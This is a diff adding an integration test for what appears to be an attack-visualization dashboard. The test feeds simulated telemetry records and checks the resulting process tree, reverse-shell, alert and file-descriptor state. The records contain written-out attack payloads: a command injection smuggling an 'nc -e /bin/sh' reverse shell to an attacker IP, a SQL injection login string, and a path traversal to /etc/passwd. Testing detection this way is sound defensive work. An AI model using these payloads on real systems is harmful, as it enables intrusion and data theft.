@@ -299,4 +299,101 @@ test('hub integration contracts', { timeout: 15000 }, async (t) => {
     assert.equal(resetRes.network_state.mitm_active, false);
     assert.equal(resetRes.network_state.arp_table.every((e: any) => e.spoofed === false), true);
   });
+
+  await t.test('W4-T1: OS & L7 attack visualization (pstree, reverse shell, lsof FD gauge, SQLi/Brute-force alerts)', async () => {
+    // 1. Baseline OS & L7 state is clean (no reverse shell, normal open_fds)
+    const initialOs = (await api('/api/telemetry/os')).data.os_l7_state;
+    assert.equal(initialOs.reverse_shell.active, false);
+    assert.equal(initialOs.fd_metrics.status, 'NORMAL');
+    assert.equal(initialOs.fd_metrics.open_fds, 42);
+
+    // 2. OS Command Injection spawns /bin/sh -> nc in pstree and activates Reverse Shell tunnel (Server -> Hacker)
+    const cmdInjLog = {
+      endpoint: '/api/system/network-ping?host=127.0.0.1;nc%20-e%20/bin/sh%20172.20.0.66%204444',
+      status_code: 200,
+      method: 'GET',
+      response_time: 25,
+      client_ip: '172.20.0.66',
+      attack_tag: 'COMMAND_INJECTION',
+      is_suspicious: true,
+      defense_action: 'allowed',
+      payload_summary: {
+        query: { host: '127.0.0.1; nc -e /bin/sh 172.20.0.66 4444' },
+        shell_cmd: 'nc -e /bin/sh 172.20.0.66 4444',
+      },
+    };
+    assert.equal((await api('/api/telemetry', cmdInjLog)).status, 200);
+
+    const afterRevShell = (await api('/api/telemetry/os')).data.os_l7_state;
+    assert.equal(afterRevShell.reverse_shell.active, true);
+    assert.equal(afterRevShell.reverse_shell.shell_cmd, 'nc -e /bin/sh 172.20.0.66 4444');
+    assert.equal(afterRevShell.l7_counters.cmd_injection_count, 1);
+    assert.equal(afterRevShell.suspicious_processes.some((p: string) => p.includes('/bin/sh')), true);
+
+    // Verify pstree contains malicious child process under node server
+    const rootProc = afterRevShell.pstree[0];
+    const nodeProc = rootProc.children.find((c: any) => c.name === 'node');
+    assert.equal(nodeProc.children.some((c: any) => c.name === '/bin/sh' && c.suspicious === true), true);
+
+    // 3. SQL Injection & Low-rate Brute-force populate L7 alerts table and counters
+    await api('/api/telemetry', {
+      endpoint: '/api/auth/login',
+      status_code: 200,
+      method: 'POST',
+      response_time: 14,
+      client_ip: '172.20.0.66',
+      attack_tag: 'SQL_INJECTION',
+      is_suspicious: true,
+      payload_summary: { body_preview: { username: "admin' OR '1'='1' --" } },
+    });
+    await api('/api/telemetry', {
+      endpoint: '/api/auth/login',
+      status_code: 401,
+      method: 'POST',
+      response_time: 10,
+      client_ip: '172.20.0.66',
+      attack_tag: 'BRUTE_FORCE',
+      is_suspicious: true,
+      payload_summary: { body_preview: { username: 'admin', password: 'guess1' }, attempts_count: 6, rate_rps: 1 },
+    });
+    await api('/api/telemetry', {
+      endpoint: '/api/files/download?file=../../../../etc/passwd',
+      status_code: 200,
+      method: 'GET',
+      response_time: 8,
+      client_ip: '172.20.0.66',
+      attack_tag: 'PATH_TRAVERSAL',
+      is_suspicious: true,
+      payload_summary: { query: { file: '../../../../etc/passwd' } },
+    });
+
+    const afterL7 = (await api('/api/telemetry/os')).data.os_l7_state;
+    assert.equal(afterL7.l7_counters.sqli_count, 1);
+    assert.equal(afterL7.l7_counters.brute_force_count, 1);
+    assert.equal(afterL7.l7_counters.path_traversal_count, 1);
+    assert.equal(afterL7.l7_alerts.length, 4);
+    assert.equal(afterL7.fd_metrics.suspicious_files.includes('/etc/passwd'), true);
+
+    // 4. File Descriptors (lsof) Exhaustion updates FD gauge to EXHAUSTED
+    await api('/api/telemetry/host', {
+      metrics: {
+        tcp_established: 22,
+        tcp_syn_recv: 5,
+        tcp_time_wait: 6,
+        open_fds: 960,
+        max_fds: 1024,
+        process_count: 32,
+      },
+    });
+    const afterFd = (await api('/api/telemetry/os')).data.os_l7_state;
+    assert.equal(afterFd.fd_metrics.open_fds, 960);
+    assert.equal(afterFd.fd_metrics.status, 'EXHAUSTED');
+    assert.equal(afterFd.fd_metrics.process_count, 32);
+
+    // 5. Reset OS restores clean pstree, terminates reverse shell, and resets open_fds
+    const resetOs = (await api('/api/telemetry/os', { action: 'reset_os' })).data.os_l7_state;
+    assert.equal(resetOs.reverse_shell.active, false);
+    assert.equal(resetOs.fd_metrics.status, 'NORMAL');
+    assert.equal(resetOs.fd_metrics.open_fds, 42);
+  });
 });
